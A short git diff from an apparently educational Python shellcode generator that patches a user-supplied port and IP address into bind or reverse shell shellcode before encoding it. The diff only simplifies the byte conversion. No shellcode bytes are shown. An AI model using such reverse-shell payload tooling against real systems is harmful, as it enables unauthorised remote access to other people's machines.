@@ -27,22 +27,15 @@ elif (args.payload == 'reverse'):
 
 # get the port in little endian format 
 res = format(int(args.port), '04x')
-res1 = res[0:2]
-res2 = res[2:]
-portbytes = bytearray.fromhex(res1 + res2)
+portbytes = bytearray.fromhex(res)
 
 shellcode = shellcode.replace(b"\x1b\x59", portbytes)
 
 if (args.payload == 'reverse'):
     # get the ip address in network byte order (big endian)
     # https://stackoverflow.com/questions/33244775/converting-ip-address-into-bytes-in-python
-    ip_as_bytes = bytes(map(int, args.address.split('.'))).hex()
-    byte1 = ip_as_bytes[0:1]
-    byte2 = ip_as_bytes[1:2]
-    byte3 = ip_as_bytes[2:3]
-    byte4 = ip_as_bytes[3:]
-    addressbytes = bytearray.fromhex(byte1 + byte2 + byte3 + byte4)
-    shellcode = shellcode.replace(b"\x7f\x00\x00\x01", addressbytes)
+    ip_as_bytes = bytes(map(int, args.address.split('.')))
+    shellcode = shellcode.replace(b"\x7f\x00\x00\x01", ip_as_bytes)
 
 newstr = ""
 newstr += "\\x90\\x50\\x90\\x50\\x90\\x50\\x90\\x50" # the key
